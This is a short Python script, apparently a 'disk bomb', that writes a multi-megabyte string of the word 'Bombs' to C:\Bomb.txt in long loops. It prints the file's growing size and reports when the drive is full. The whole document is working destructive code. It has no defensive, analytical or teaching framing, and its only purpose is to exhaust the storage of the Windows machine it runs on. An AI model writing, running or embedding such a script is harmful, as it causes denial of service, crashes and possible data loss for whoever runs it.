BombText = ("Bombs"*5000000)
import os

f = open ("C:\\Bomb.txt","w")
try:
    for i in range (1,99000):
        f.write(BombText)
        t = os.path.getsize("C:\\Bomb.txt") >> 20
        print (t,"mb")
    for i in range (1,99000):
        f.write(BombText)
except OSError:
    print ("[*]Drive is currently full")
